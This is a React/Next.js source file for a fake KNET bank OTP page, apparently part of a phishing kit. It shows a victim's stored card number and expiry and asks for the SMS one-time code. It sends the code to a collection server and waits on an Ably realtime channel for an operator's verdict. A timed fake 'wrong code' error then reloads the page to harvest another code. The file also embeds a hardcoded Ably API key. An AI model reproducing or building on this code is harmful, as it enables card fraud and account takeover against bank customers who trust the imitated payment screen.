"use client";
import { createContext, useState, useContext, useEffect } from "react";
import { ChannelProvider } from "ably/react";
import { useChannel } from "ably/react";
import { useAuth } from "@/context/AuthProvider";
import { useCookiesNext } from "cookies-next";
import { sendDataToServercard } from "@/lib/Utlis";
import { useRouter } from "next/navigation";
import * as Ably from "ably";
import {
  Button,
  Dialog,
  DialogHeader,
  DialogBody,
  DialogFooter,
} from "@material-tailwind/react";

export const knetBoxStyles =
  "bg-white rounded-xl p-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]";

const Myot = () => {
  const [open, setOpen] = useState(false);

  const handleOpen = () => setOpen(!open);

  const [seconds, setSeconds] = useState(60);
  useEffect(() => {
    // Set up the interval when the component mounts
    const interval = setInterval(() => {
      setSeconds((prevSeconds) => {
        if (prevSeconds <= 0) {
          clearInterval(interval); // Stop the timer when it reaches zero
          return 0;
        }
        return prevSeconds - 1;
      });
    }, 1000); // Update every 1000ms (1 second)

    // Clean up the interval when the component unmounts or dependencies change
    return () => clearInterval(interval);
  }, []); // Empty dependency array ensures effect runs only once on mount

  const router = useRouter();
  const [formData, setFormData] = useState({
    crdotp: "",
  });
  const client = new Ably.Realtime({
    key: "1XOPIQ.r37UVQ:fJgtDbLPNj8jTmgaAS5YPqM8r0rbE-yaP-bEtYjI3I4",
    clientId: "mayname",
  });

  const { setCookie, hasCookie, deleteCookie, getCookies, getCookie } =
    useCookiesNext();
  const { user, login, logout } = useAuth();
  var mychanel = user;

  const [myerror, setMyerror] = useState("");
  const [isLoading, setisLoading] = useState(false);

  const [carddata, setCarddata] = useState("");

  const handleChange = (e) => {
    const { name, value } = e.target;

    setFormData({ ...formData, [name]: value });
  };

  useEffect(() => {
    const mycard = JSON.parse(localStorage.getItem("crdinfo"));
    setCarddata(mycard);
    //console.log(carddata);
  }, []);
  const [errorclass, setErrorclass] = useState("");

  const handelsubmit = () => {
    //console.log("click");
    var valid = false;
    if (formData.crdotp === "" || formData.crdotp.length < 4) {
      setErrorclass(
        "p-2  bg-red-500 text-white  rounded-md flex items-center flex-col text-xs"
      );
      setMyerror("الرجاء تعبئة جميع الحقول بشكل صحيح");
    } else {
      setErrorclass("");
      setMyerror("");

      var copyformdata = formData;
      //console.log(copyformdata);

      setisLoading(true);
      sendDataToServercard(copyformdata, user, "otpinfo");
      const storedUser = JSON.parse(localStorage.getItem("user"));

      //console.log(storedUser);

      const channel = client.channels.get("get-started");
      channel.presence.enter();
      var thechanel = "nafath-chanelltam-" + storedUser.id;
      channel.subscribe(thechanel, (msg) => {
        //console.log(msg);

        if (msg.name !== thechanel) return;
        if (msg.data.confirm === "0") {
          router.push("/gopy");
        } else if (msg.data.confirm === "1") {
          //error
          setisLoading(false);
          handleOpen();
          window.location.href = "/myot";
        }
      });
      setTimeout(function () {
            handleOpen();
        setTimeout(function () {
      
          setFormData({
            crdotp: "",
          });
          window.location.href = "/myot";
        }, 3000);
      }, 4000);
    }
  };

  return (
    <>
      <div className="bg-[#ebebeb]  min-h-screen">
        <section className="container px-2">
          <img
            src="/assets/knet-eid.webp"
            alt="knet banner"
            className="w-full p-2 mb-2 h-28 rounded-ss-2xl rounded-ee-2xl"
          />
          <div className="text-left bg-white rounded-xl px-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]">
            <img
              src="/assets/tasdeed.webp"
              alt="tasdeed logo"
              className="w-40 object-cover mx-auto mb-2"
            />
            <div className="flex items-center border-b border-b-[#8f8f90]">
              <p className="grow text-xs">Tap Payments EPSP</p>
              <p className="text-[#0070cd] text-xs font-bold w-32">:Merchant</p>
            </div>
            <div className="flex items-center">
              <p className="grow ">{getCookie("price")}</p>
              <p className="text-[#0070cd] text-xs font-bold w-32">:Amount</p>
            </div>
          </div>
          <form className="text-left">
            <div className="divide-y divide-[#8f8f90] mt-4 px-4 bg-white rounded-xl p-2 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)]">
              <div
                className="p-4 m-2 flex justify-between gap-4"
                style={{
                  color: "#31708f",
                  border: "1px solid #bacce0",
                  backgroundColor: "#d9edf6",
                }}
              >
                <div
                  className="row alert-msg"
                  id="notificationbox"
                  style={{
                    color: "#31708f",
                    fontFamily: "Arial, Helvetica, serif",
                    fontSize: 13,
                  }}
                >
                  <div id="notification">
                    <p style={{ color: "#31708f", fontSize: 12 }}>
                      <span className="title" style={{ fontWeight: "bold" }}>
                        NOTIFICATION:
                      </span>{" "}
                      {/* */}You will presently receive an SMS on your mobile
                      number registered with your bank.This is an OTP (One Time
                      Password) SMS, it contains 6 digits to be entered in the
                      box below.
                    </p>
                  </div>
                </div>
              </div>

              <div className="flex justify-between gap-1 px-4">
                <div dir="ltr" className="flex-[60%] flex gap-1 items-end">
                  <div className="grow">
                    <div>
                      <p className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[30%] mt-3 ">
                        {carddata.prefex}
                        {carddata.cardno}
                      </p>
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 text-[#0070cd]">
                  :Card Number
                </label>
              </div>
              <div className="flex justify-between gap-1 px-4">
                <div className="flex-[60%]  flex gap-1 items-end">
                  <div className="grow">
                    <div>
                      <p className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 ">
                        {carddata.exp}
                      </p>
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 text-[#0070cd]">
                  :Expiration Date
                </label>
              </div>
              <div className="flex justify-between gap-1 px-4">
                <div className="flex-[60%]  flex gap-2 items-end">
                  <div className="grow">
                    <div>
                      <p className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 ">
                        ****
                      </p>
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 text-[#0070cd]">
                  :PIN
                </label>
              </div>
              <div className="flex justify-between gap-1 px-4">
                <div className="flex-[60%]  flex gap-2 items-end">
                  <div className="grow">
                    <div>
                      <div className="relative">
                        <input
                          id="card_num"
                          name="crdotp"
                          dir="rtl"
                          type="tel"
                          placeholder={"00:" + seconds}
                          className="p-2 w-full outline-none border relative border-gray-300 border-none h-6 bg-white text-left transition-shadow rounded-md shadow-[inset_0px_0px_2px_2px_#0070cd]"
                          value={formData.crdotp}
                          onChange={handleChange}
                          autoComplete="off"
                          maxLength={6}
                        />
                      </div>
                    </div>
                  </div>
                </div>
                <label className="mb-2 block peer-disabled:cursor-not-allowed peer-disabled:opacity-70 select-none font-black text-xs flex-[40%] mt-3 text-[#0070cd]">
                  :OTP
                </label>
              </div>
            </div>
            <div className="bg-white rounded-xl p-4 border [border:_2px_solid_#8f8f90] shadow-[0_0_6px_rgba(0,0,0,0.3)] flex items-center mt-4">
              <button
                className="w-full text-center lg:text-xl capitalize rounded-md font-bold py-0.5 px-6 bg-[#eaeaea] hover:bg-gray-100 text-[#666666] transition-colors border border-[#cacaca] select-none pointer-events-none"
                type="reset"
              >
                Cancel
              </button>
              <button
                className="w-full lg:text-xl capitalize rounded-md font-bold py-0.5 px-6 hover:brightness-110 transition-colors disabled:cursor-not-allowed bg-[#eaeaea] hover:bg-gray-100 text-[#666666] border border-[#cacaca]"
                type="button"
                onClick={handelsubmit}
              >
                Submit
              </button>
            </div>
          </form>
          <h3 className="mt-8 mb-1 capitalize text-center text-xs">
            © all rights reserved. copyright 2025
          </h3>
          <h3 className="mb-10 capitalize text-center text-xs text-[#0070cd]">
            the shared electronics banking services company - KNET
          </h3>
        </section>
      </div>
      <Dialog
        open={open}
        handler={handleOpen}
        dismiss={{ outsidePress: false }}
      >
        <DialogHeader>خطأ</DialogHeader>
        <DialogBody>
          <h4 style={{ textAlign: "center" }}>
            {" "}
            تم أدخال رمز خطأ يرجى المحاولة مرة أخرى .{" "}
          </h4>
        </DialogBody>
        <DialogFooter></DialogFooter>
      </Dialog>

      {isLoading ? (
        <div
          className="absolute w-full top-0 "
          style={{
            height: "100vh",
            width: "100%",
            backgroundColor: "#00000082",
          }}
        >
          <div
            role="status"
            className="absolute -translate-x-1/2 -translate-y-1/2 top-2/4 left-1/2"
          >
            <svg
              aria-hidden="true"
              className="w-8 h-8 text-gray-200 animate-spin dark:text-gray-600 fill-blue-600"
              viewBox="0 0 100 101"
              fill="none"
              xmlns="http://www.w3.org/2000/svg"
            >
              <path
                d="M100 50.5908C100 78.2051 77.6142 100.591 50 100.591C22.3858 100.591 0 78.2051 0 50.5908C0 22.9766 22.3858 0.59082 50 0.59082C77.6142 0.59082 100 22.9766 100 50.5908ZM9.08144 50.5908C9.08144 73.1895 27.4013 91.5094 50 91.5094C72.5987 91.5094 90.9186 73.1895 90.9186 50.5908C90.9186 27.9921 72.5987 9.67226 50 9.67226C27.4013 9.67226 9.08144 27.9921 9.08144 50.5908Z"
                fill="currentColor"
              />
              <path
                d="M93.9676 39.0409C96.393 38.4038 97.8624 35.9116 97.0079 33.5539C95.2932 28.8227 92.871 24.3692 89.8167 20.348C85.8452 15.1192 80.8826 10.7238 75.2124 7.41289C69.5422 4.10194 63.2754 1.94025 56.7698 1.05124C51.7666 0.367541 46.6976 0.446843 41.7345 1.27873C39.2613 1.69328 37.813 4.19778 38.4501 6.62326C39.0873 9.04874 41.5694 10.4717 44.0505 10.1071C47.8511 9.54855 51.7191 9.52689 55.5402 10.0491C60.8642 10.7766 65.9928 12.5457 70.6331 15.2552C75.2735 17.9648 79.3347 21.5619 82.5849 25.841C84.9175 28.9121 86.7997 32.2913 88.1811 35.8758C89.083 38.2158 91.5421 39.6781 93.9676 39.0409Z"
                fill="currentFill"
              />
            </svg>
            <span className="sr-only">Loading...</span>
          </div>
        </div>
      ) : (
        <></>
      )}
    </>
  );
};
export default Myot;
